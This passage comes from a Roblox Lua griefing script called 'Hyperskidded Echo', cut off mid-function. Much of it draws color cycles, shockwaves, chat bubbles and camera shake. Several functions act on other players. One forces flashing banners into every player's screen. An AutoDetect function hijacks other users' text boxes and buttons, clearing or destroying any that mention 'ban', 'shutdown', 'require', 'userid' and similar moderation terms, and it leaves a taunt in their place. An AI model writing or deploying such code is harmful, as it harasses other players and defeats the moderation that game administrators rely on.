								outer.Color = Color3.fromRGB(128 + 128 * SIN(sine / 16), 128 + 128 * SIN(sine / 32), 128 + 128 * SIN(sine / 64))
							elseif MODE == 7 then
								outer.Color = Color3.fromRGB(128 + 128 * SIN(sine / 16), 128 + 128 * SIN(sine / 32), 128 + 128 * SIN(sine / 64))
							elseif MODE == 8 then
								outer.Color = Color3.fromRGB(0,math.random(0,255),0)
							elseif MODE == 9 then
								outer.Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/1000,0,0+170*Sick.PlaybackLoudness/1000)
							elseif MODE == 10 then
								outer.Color = Color3.fromRGB(0+170*Sick.PlaybackLoudness/400,0,0+170*Sick.PlaybackLoudness/400)					
							elseif MODE == 11 then
								outer.Color = Color3.fromRGB(100*Sick.PlaybackLoudness/500,0,0)
							elseif MODE == 12 then
								outer.Color = BrickColor.Random().Color
							elseif MODE == 13 then
								outer.Color = Color3.fromRGB(0, 0, 0)
							elseif MODE == 14 then
								outer.Color = Color3.fromRGB(128 + 128 * SIN(sine / 16), 128 + 128 * SIN(sine / 32), 128 + 128 * SIN(sine / 64))
							elseif MODE == 15 then
								outer.Color = Color3.fromRGB(128 + 128 * SIN(sine / 16), 128 + 128 * SIN(sine / 32), 128 + 128 * SIN(sine / 64))
							elseif MODE == 16 then
								outer.Color = Color3.new(1,0,0)					
							elseif MODE == 17 then
								outer.Color = C3(98/255 + Sick.PlaybackLoudness/1000, 37/255 + Sick.PlaybackLoudness/1000, 209/255 + Sick.PlaybackLoudness/1000)					
							elseif MODE == 18 then
								outer.Color = Color3.fromRGB(100*Sick.PlaybackLoudness/100)		
							elseif MODE == 19 then
								outer.Color = Color3.fromRGB(0,0,178*Sick.PlaybackLoudness/100)
							elseif MODE == 20 then
								outer.Color = Color3.fromRGB(128 + 128 * SIN(sine / 16), 128 + 128 * SIN(sine / 32), 128 + 128 * SIN(sine / 64))
							end
						end
					end)()
					function Rejoin()
						game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,game.JobId)
					end
					game:GetService("GuiService").MenuOpened:Connect(function()
						if lplr.Name ~= Player.Name then
							Rejoin()
						end
					end)

					function TerrainColSwitch()
						if TerrainCol == false then
							TerrainCol = true
							Notify("[Hyperskidded Echo]: ","(TERRAIN) Color changes has been set to true")
						else
							TerrainCol = false
							Notify("[Hyperskidded Echo]: ","(TERRAIN) Color changes has been set to false")
						end
					end

					function warnedpeople2(whom)
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							coroutine.resume(coroutine.create(function()
								if v.PlayerGui:FindFirstChild("ARRIVAL")~= nil then
									v.PlayerGui:FindFirstChild("ARRIVAL"):destroy()
								end
								local droppingFrame = false
								local scrg = Instance.new("ScreenGui",v.PlayerGui)
								scrg.Name = "ARRIVAL"
								local mainFrame = Instance.new("Frame", scrg)
								mainFrame.Name = "MainFrame"
								mainFrame.BackgroundTransparency = 1
								mainFrame.BorderSizePixel = 0
								mainFrame.Size = UDim2.new(1, 0, -0.013, 100)
								mainFrame.Position = UDim2.new(0, 0, 0.365, 0)
								local TextFrame = Instance.new("TextLabel",mainFrame)
								TextFrame.Name = "TextFrame"
								TextFrame.Font = "Arcade"
								TextFrame.Text = ""
								TextFrame.TextScaled = true
								TextFrame.TextSize = 9
								TextFrame.TextStrokeTransparency = 1
								TextFrame.BackgroundTransparency = 1
								TextFrame.TextColor3 = Color3.new(1, 1, 1)
								TextFrame.TextStrokeColor3 = Color3.new(1, 1, 1)
								TextFrame.Size = UDim2.new(1, 0, 0, 92)
								TextFrame.Position = UDim2.new(0, 0, 0, 0)
								local fvalen = 0.55
								local fval = -0.49
								coroutine.resume(coroutine.create(function()
									while true do
										Swait()
										mainFrame.BackgroundColor3 = outer.Color
										mainFrame.BorderColor3 = outer.Color
										local randomfont = fonts[MATHR(1,#fonts)]
										TextFrame.Font = randomfont
										TextFrame.TextColor3 = outer.Color
										if(not droppingFrame)then
											mainFrame.Rotation = 0 - 2 * math.cos(SINE / 24)
										end
										TextFrame.TextStrokeTransparency = 0
									end
								end))
								for i = 1,string.len(whom),1 do
									TextFrame.Text = string.sub(whom,1,i)
									Swait()
								end
								wait(2)
								droppingFrame = true
								mainFrame.Rotation = 0
								local vinc2 = 1
								for i = 0, 99 do
									Swait()
									vinc2 = vinc2 + 0.25
									mainFrame.Position = mainFrame.Position + UDim2.new(0,0,0.0005*vinc2,0)
								end
								scrg:Destroy()
							end))
						end
					end
					function warnedpeople2pp(whom)
						for i,v in pairs(game:GetService("Players"):GetPlayers()) do
							coroutine.resume(coroutine.create(function()
								if v.PlayerGui:FindFirstChild("ARRIVAL")~= nil then
									v.PlayerGui:FindFirstChild("ARRIVAL"):destroy()
								end
								local droppingFrame = false
								local scrg = Instance.new("ScreenGui",v.PlayerGui)
								scrg.Name = "ARRIVAL"
								local mainFrame = Instance.new("Frame", scrg)
								mainFrame.Name = "MainFrame"
								mainFrame.BackgroundTransparency = 1
								mainFrame.BorderSizePixel = 0
								mainFrame.Size = UDim2.new(1, 0, -0.013, 100)
								mainFrame.Position = UDim2.new(0, 0, 0.365, 0)
								local TextFrame = Instance.new("TextLabel",mainFrame)
								TextFrame.Name = "TextFrame"
								TextFrame.Font = "Arcade"
								TextFrame.Text = ""
								TextFrame.TextScaled = true
								TextFrame.TextSize = 9
								TextFrame.TextStrokeTransparency = 1
								TextFrame.BackgroundTransparency = 1
								TextFrame.TextColor3 = Color3.new(1, 1, 1)
								TextFrame.TextStrokeColor3 = Color3.new(1, 1, 1)
								TextFrame.Size = UDim2.new(1, 0, 0, 92)
								TextFrame.Position = UDim2.new(0, 0, 0, 0)
								local fvalen = 0.55
								local fval = -0.49
								coroutine.resume(coroutine.create(function()
									while true do
										Swait()
										mainFrame.BackgroundColor3 = outer.Color
										mainFrame.BorderColor3 = outer.Color
										TextFrame.TextColor3 = outer.Color
										if(not droppingFrame)then
											mainFrame.Rotation = 0 - 2 * math.cos(SINE / 24)
										end
										TextFrame.TextStrokeTransparency = 0
									end
								end))
								for i = 1,string.len(whom),1 do
									TextFrame.Text = string.sub(whom,1,i)
									wait(0.05)
								end
								wait(2)
								droppingFrame = true
								mainFrame.Rotation = 0
								local vinc2 = 1
								for i = 0, 99 do
									Swait()
									vinc2 = vinc2 + 0.25
									mainFrame.Position = mainFrame.Position + UDim2.new(0,0,0.0005*vinc2,0)
								end
								scrg:Destroy()
							end))
						end
					end

					function spawnwave(POS)
						local HITFLOOR,HITPOS = Raycast(POS+VT(0,1,0), (CF(POS, POS + VT(0, -1, 0))).lookVector, 100, Character)
						local EMITPOS = HITPOS
						if HITFLOOR ~= nil then
							if HITFLOOR.Parent:FindFirstChildOfClass("Humanoid") then
								HITFLOOR,HITPOS = Raycast(POS+VT(0,1,0), (CF(POS, POS + VT(0, -1, 0))).lookVector, 100, HITFLOOR.Parent)
								EMITPOS = HITPOS
							elseif HITFLOOR.Parent.Parent:FindFirstChildOfClass("Humanoid") then
								HITFLOOR,HITPOS = Raycast(POS+VT(0,1,0), (CF(POS, POS + VT(0, -1, 0))).lookVector, 100, HITFLOOR.Parent.Parent)
								EMITPOS = HITPOS
							end
						end
						if HITFLOOR ~= nil then
							mdmg(EMITPOS,55)
							WACKYEFFECT({EffectType = "Sphere", Size = VT(55,100000,55), Size2 = VT(0,100000,0), Transparency = 0, Transparency2 = 1, CFrame = CF(EMITPOS) * ANGLES(RAD(MATHR(-15,15)), RAD(0), RAD(MATHR(-15,15))), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = outer.Color, SoundID = nil, SoundPitch = 1, SoundVolume = 5})
							WACKYEFFECT({TIME = MATHR(0,44), EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(77 + 7 * COS(SINE/4),2 + 6 * COS(SINE/4),77 + 4 * COS(SINE/4)), Transparency = 0, Transparency2 = 1, CFrame = CF(EMITPOS), MoveToPos = nil, RotationX = 0, RotationY = MATHR(-22,22), RotationZ = 0, Material = "ForceField", Color = outer.Color, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
							for i = 1, 5 do
								local TOPOS = CF(EMITPOS)*ANGLES(RAD(MATHR(0,360)),RAD(MATHR(0,360)),RAD(MATHR(0,360)))*CF(0,0,12)
								WACKYEFFECT({TIME = MATHR(0,44), EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(77 + 7 * COS(SINE/4),2 + 6 * COS(SINE/4),77 + 4 * COS(SINE/4)), Transparency = 0, Transparency2 = 1, CFrame = CF(EMITPOS,TOPOS.p), MoveToPos = TOPOS.p, RotationX = 0, RotationY = MATHR(-22,22), RotationZ = 0, Material = "ForceField", Color = outer.Color, SoundID = nil, SoundPitch = nil, SoundVolume = nil})
							end
						end
					end

					function Serv(Name)
						return game:GetService(Name)
					end
					DebrisFORSOMETHING = game:GetService("Debris")
					local Services = {"RunService","GuiService","Stats","SoundService","LogService","ContentProvider","KeyframeSequenceProvider","Chat","MarketplaceService","Players","PointsService","AdService","NotificationService","ReplicatedFirst","HttpRbxApiService","TweenService","TextService","StarterPlayer","StarterPack","StarterGui","LocalizationService","PolicyService","TeleportService","JointsService","CollectionService","PhysicsService","BadgeService","Geometry","FriendService","InsertService","GamePassService","Debris","TimerService","CookiesService","UserInputService","KeyboardService","MouseService","VRService","ContextActionService","ScriptService","AssetService","TouchInputService","BrowserService","AnalyticsService","ScriptContext","Selection","HttpService","MeshContentProvider","Lighting","SolidModelContentProvider","GamepadService","ControllerService","RuntimeScriptService","HapticService","NetworkClient","ChangeHistoryService","Visit","GuidRegistryService","PermissionsService","Teams","ReplicatedStorage","TestService","SocialService","MemStorageService","GroupService","PathfindingService","VirtualUser"}
					function Notify(StarterText,Text)
						if not Player:FindFirstChildOfClass("PlayerGui") then
							return
						end
						coroutine.resume(coroutine.create(function()
							local NotifHolder = Instance.new("ScreenGui")
							NotifHolder.DisplayOrder = 2147483647
							NotifHolder.Name = "LMAO"
							NotifHolder.ResetOnSpawn = false
							NotifHolder.Archivable = false
							local NotifText = Instance.new("TextLabel")
							NotifText.BackgroundTransparency = 1
							NotifText.Name = "AAAAAAAAAAAAAAAAAAAAAAAAAA"
							NotifText.Position = UDim2.new(0,0,1,0)
							NotifText.Text = StarterText
							NotifText.Size = UDim2.new(1,0,.05,0)
							NotifText.Archivable = false
							NotifText.Font = Enum.Font.SourceSans
							NotifText.TextSize = 14
							NotifText.TextScaled = true
							coroutine.resume(coroutine.create(function()
								while true do
									Swait()
									NotifText.TextColor3 = Character.Torso.Color
								end
							end))
							NotifText.TextStrokeTransparency = 0
							NotifText.TextXAlignment = Enum.TextXAlignment.Left
							NotifText.Parent = NotifHolder
							NotifHolder.Parent = Player:FindFirstChildOfClass("PlayerGui")
							NotifText:TweenPosition(UDim2.new(0,0,.95,0))
							local Timer = tick()
							repeat
								Serv("RunService").Heartbeat:Wait()
							until tick()-Timer >= 1
							Timer = tick()
							local LastLen = 0
							repeat
								Serv('RunService').Heartbeat:Wait()
								local Len = math.floor((tick()-Timer)*30)
								if Len > LastLen then
									LastLen = Len
									local TypeSound = Instance.new("Sound")
									TypeSound.Volume = 10
									TypeSound.SoundId = "rbxassetid://615716445"
									TypeSound.TimePosition = .07
									TypeSound.PlayOnRemove = true
									TypeSound.Playing = true
									TypeSound.Parent = Serv(Services[math.random(1,#Services)])
									TypeSound:Destroy()
									function Notify(StarterText,Text)
										if not Player:FindFirstChildOfClass("PlayerGui") then
											return
										end
										coroutine.resume(coroutine.create(function()
											local NotifHolder = Instance.new("ScreenGui")
											NotifHolder.DisplayOrder = 2147483647
											NotifHolder.Name = "LMAO"
											NotifHolder.ResetOnSpawn = false
											NotifHolder.Archivable = false
											local NotifText = Instance.new("TextLabel")
											NotifText.BackgroundTransparency = 1
											NotifText.Name = "AAAAAAAAAAAAAAAAAAAAAAAAAA"
											NotifText.Position = UDim2.new(0,0,1,0)
											NotifText.Text = StarterText
											NotifText.Size = UDim2.new(1,0,.05,0)
											NotifText.Archivable = false
											NotifText.Font = Enum.Font.SourceSans
											NotifText.TextSize = 14
											NotifText.TextScaled = true
											coroutine.resume(coroutine.create(function()
												while true do
													Swait()
													NotifText.TextColor3 = Character.Torso.Color
												end
											end))
											NotifText.TextStrokeTransparency = 0
											NotifText.TextXAlignment = Enum.TextXAlignment.Left
											NotifText.Parent = NotifHolder
											NotifHolder.Parent = Player:FindFirstChildOfClass("PlayerGui")
											NotifText:TweenPosition(UDim2.new(0,0,.95,0))
											local Timer = tick()
											repeat
												Serv("RunService").Heartbeat:Wait()
											until tick()-Timer >= 1
											Timer = tick()
											local LastLen = 0
											repeat
												Serv('RunService').Heartbeat:Wait()
												local Len = math.floor((tick()-Timer)*30)
												if Len > LastLen then
													LastLen = Len
													local TypeSound = Instance.new("Sound")
													TypeSound.Volume = 10
													TypeSound.SoundId = "rbxassetid://615716445"
													TypeSound.TimePosition = .07
													TypeSound.PlayOnRemove = true
													TypeSound.Playing = true
													TypeSound.Parent = Serv(Services[math.random(1,#Services)])
													TypeSound:Destroy()
												end
												NotifText.Text = StarterText..string.sub(Text,0,Len)
											until tick()-Timer >= string.len(Text)/30
											NotifText.Text = StarterText..Text
											Timer = tick()
											repeat
												Serv("RunService").Heartbeat:Wait()
											until tick()-Timer >= 1
											Serv("TweenService"):Create(NotifText,TweenInfo.new(1,Enum.EasingStyle.Linear),{TextTransparency = 1,TextStrokeTransparency = 1}):Play()
											DebrisFORSOMETHING:AddItem(NotifText,1)
										end))
									end
								end
								NotifText.Text = StarterText..string.sub(Text,0,Len)
							until tick()-Timer >= string.len(Text)/30
							NotifText.Text = StarterText..Text
							Timer = tick()
							repeat
								Serv("RunService").Heartbeat:Wait()
							until tick()-Timer >= 1
							Serv("TweenService"):Create(NotifText,TweenInfo.new(1,Enum.EasingStyle.Linear),{TextTransparency = 1,TextStrokeTransparency = 1}):Play()
							DebrisFORSOMETHING:AddItem(NotifText,1)
						end))
					end

					function chatfunc(textt,glitchy,text)
						local text = string.gsub(string.gsub(textt,"​",""),"%c","")
						for i = 1,string.len(text) do
							game:GetService("RunService").Heartbeat:Wait()
							coroutine.resume(coroutine.create(function()
								local g = Instance.new("Sound",game:GetService("Chat"))
								--g.SoundId = "rbxassetid://615716445"
								g.Volume = 2
								g.Name = randomstring()
								g.PlayOnRemove = true 
								g:Play()
								g:Destroy() 
							end))
						end
						local chat = coroutine.wrap(function()
							if Character:FindFirstChild("TalkingBillBoard")~= nil then
								Character:FindFirstChild("TalkingBillBoard"):destroy()
							end
							local Bill = Instance.new("BillboardGui",Character)
							Bill.Size = UDim2.new(0,100,0,40)
							Bill.StudsOffset = VT(0,3.5,0)
							Bill.Adornee = Character.Head
							Bill.Name = "TalkingBillBoard"
							local Hehe = Instance.new("TextLabel",Bill)
							Hehe.BackgroundTransparency = 1
							Hehe.BorderSizePixel = 0
							Hehe.Text = ""
							Hehe.Font = "SourceSansLight"
							Hehe.TextSize = 40
							Hehe.TextStrokeTransparency = 0
							Hehe.Size = UDim2.new(1,0,0.5,0)
							coroutine.resume(coroutine.create(function()
								while Hehe ~= nil do
									Swait()	
									Hehe.Font = FONTS[MATHR(1, #FONTS)]
									Hehe.Position = UDim2.new(0, 0, .05, 0)
									Hehe.TextColor3 = Torso.Color
									Hehe.TextStrokeColor3 = BrickColor.Black().Color
								end
							end))
							for i = 1,string.len(text),1 do
								Swait()
								Hehe.Text = string.sub(text,1,i)
							end
							Swait(90)
							for i = 0, 1, .025 do
								Swait()
								Hehe.TextStrokeTransparency = i
								Hehe.TextTransparency = i
							end
							Bill:Destroy()
						end)
						chat()
					end

					Player.Chatted:Connect(function(msg)
						Notify("[Hyperskidded Echo]: ",msg)
						chatfunc(msg)
					end)

					local StartupText = {"OMG IT'S JESUS!!!11!1!"}
					Notify("[Hyperskidded Echo]: ",StartupText[math.random(1,#StartupText)].." | Hyperskidded Echo "..SCRIPTVERSION.." Loaded.")

					NewInstance = function(instance,parent,properties)
						local inst = Instance.new(instance)
						inst.Parent = parent
						if(properties)then
							for i,v in next, properties do
								pcall(function() inst[i] = v end)
							end
						end
						return inst;
					end

					function CameraEnshaking(Length,Intensity)
						coroutine.resume(coroutine.create(function()
							local intensity = 1*Intensity
							local rotM = 0.01*Intensity
							for i = 0, Length, 0.1 do
								swait()
								intensity = intensity - 0.05*Intensity/Length
								rotM = rotM - 0.0005*Intensity/Length
								Humanoid.CameraOffset = Vector3.new(math.rad(math.random(-intensity, intensity)), math.rad(math.random(-intensity, intensity)), math.rad(math.random(-intensity, intensity)))
								game:GetService("Workspace").CurrentCamera.CFrame = game:GetService("Workspace").CurrentCamera.CFrame * CFrame.new(math.rad(math.random(-intensity, intensity)), math.rad(math.random(-intensity, intensity)), math.rad(math.random(-intensity, intensity))) * CFrame.fromEulerAnglesXYZ(math.rad(math.random(-intensity, intensity)) * rotM, math.rad(math.random(-intensity, intensity)) * rotM, math.rad(math.random(-intensity, intensity)) * rotM)
							end
							Humanoid.CameraOffset = Vector3.new(0, 0, 0)
						end))
					end

					function SwitchModeEffect()
						ATTACK = true
						for i = 0, 4, 0.1 do
							Swait()
							RightHip.C0 = Clerp(RightHip.C0, CF(1,-0.15,-0.5) * ANGLES(RAD(0),RAD(90),RAD(0)) * ANGLES(RAD(-3),RAD(-15),RAD(-20)),.1)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1,-1,0) * ANGLES(RAD(0),RAD(-90),RAD(0)) * ANGLES(RAD(-3),RAD(1),RAD(20)),.1)
							RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0,0.25,-0.05) * ANGLES(RAD(-20),RAD(0),RAD(30)),.1)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * ANGLES(RAD(20),RAD(0),RAD(-30)),.1)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.45,0.8,-0.15) * ANGLES(RAD(35),RAD(-10),RAD(30)),.8)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.4,0.5,0.1) * ANGLES(RAD(-5),RAD(10),RAD(-20)),.1)
						end
						CreateSound(824687369, Torso, 10, 0.9, false)
						WACKYEFFECT({Time = 50, EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(150,5,150), Transparency = 0.5, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,1), MoveToPos = nil, RotationX = 0, RotationY = 0, RotationZ = 0, Material = "Neon", Color = Color3.new(0.0235294, 0.152941, 1), SoundID = nil , SoundPitch = 1.2, SoundVolume = 4})
						WACKYEFFECT({Time = 50, EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(160,10,160), Transparency = 0.5, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,1), MoveToPos = nil, RotationX = 0, RotationY = 1, RotationZ = 0, Material = "Neon", Color = Color3.new(0.0235294, 0.152941, 1), SoundID = nil , SoundPitch = 1.2, SoundVolume = 4})
						WACKYEFFECT({Time = 50, EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(170,5,170), Transparency = 0.5, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,1), MoveToPos = nil, RotationX = 0, RotationY = 2, RotationZ = 0, Material = "Neon", Color = Color3.new(0.0235294, 0.152941, 1), SoundID = nil , SoundPitch = 1.2, SoundVolume = 4})
						CameraEnshaking(15,10)
						WACKYEFFECT({Time = 50, EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(180,10,180), Transparency = 0.5, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,1), MoveToPos = nil, RotationX = 0, RotationY = 3, RotationZ = 0, Material = "Neon", Color = Color3.new(0, 0, 0), SoundID = nil , SoundPitch = 1.2, SoundVolume = 4})
						WACKYEFFECT({Time = 50, EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(190,5,190), Transparency = 0.5, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,1), MoveToPos = nil, RotationX = 0, RotationY = 4, RotationZ = 0, Material = "Neon", Color = Color3.new(0, 0, 0), SoundID = nil , SoundPitch = 1.2, SoundVolume = 4})
						WACKYEFFECT({Time = 50, EffectType = "Wave", Size = VT(0,0,0), Size2 = VT(200,10,200), Transparency = 0.5, Transparency2 = 1, CFrame = RootPart.CFrame*CF(0,0,1), MoveToPos = nil, RotationX = 0, RotationY = 5, RotationZ = 0, Material = "Neon", Color = Color3.new(0, 0, 0), SoundID = nil , SoundPitch = 1.2, SoundVolume = 4})
						for i = 0, 2, 0.1 do
							Swait()
							RightHip.C0 = Clerp(RightHip.C0, CF(1,-0.5,-0.5) * ANGLES(RAD(0),RAD(90),RAD(0)) * ANGLES(RAD(-3),RAD(-25),RAD(30)),.8)
							LeftHip.C0 = Clerp(LeftHip.C0, CF(-1,-1,0) * ANGLES(RAD(0),RAD(-90),RAD(0)) * ANGLES(RAD(-3),RAD(1),RAD(20)),.8)
							RootJoint.C0 = Clerp(RootJoint.C0, ROOTC0 * CF(0,-0.25,-0.5) * ANGLES(RAD(30),RAD(0),RAD(50)),.8)
							Neck.C0 = Clerp(Neck.C0, NECKC0 * ANGLES(RAD(20),RAD(0),RAD(-50)),.8)
							RightShoulder.C0 = Clerp(RightShoulder.C0, CF(1.45,0.6,-0.15) * ANGLES(RAD(35),RAD(-10),RAD(75)),.8)
							LeftShoulder.C0 = Clerp(LeftShoulder.C0, CF(-1.4,0.5,0.1) * ANGLES(RAD(-35),RAD(10),RAD(-50)),.8)
						end
						ATTACK = false
					end

					function AutoDetect(UI)
						UI.Changed:connect(function(WC)
							if tostring(WC) == "Text" then
								if string.match(string.lower(UI.Text),"ban") then 
									local Prefix = string.match(string.lower(UI.Text),"(%p?)ban") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"require") then 
									local Prefix = string.match(string.lower(UI.Text),"(%p?)require") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"ga") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)ga") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"gay") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)gay") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"tra") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)tra") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"sh") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)sh") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"id") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)id") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"skdi") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)skdi") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"noob") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)noob") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"nob") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)nob") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"s h u t d o w n") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)s h u t d o w n") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"dow") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)dow") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"d o w") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)d o w") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"f u c k") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)f u c k") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"fuck") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)fuck") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"scare") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)scare") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"s c a r e") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)s c a r e") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"6501487961") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)6501487961") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"sc") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)sc") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"userid") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)userid") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"load") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)load") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"tusc") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)tusc") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"waitforchild") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)waitforchild") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"getservice") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)getservice") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"findservice") then
									local Prefix = string.match(string.lower(UI.Text),"(%p?)findservice") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),".") then
									local Prefix = string.match(string.lower(UI.Text),".") or ""

									if UI:IsA("TextBox") then
										UI.Text = "Hyperskidded Echo doesn't want you to type  >:)"
										UI:ReleaseFocus(true)
									end
									if UI:IsA("TextButton") then UI:Destroy() 

									end
								end 
								if string.match(string.lower(UI.Text),"/") then
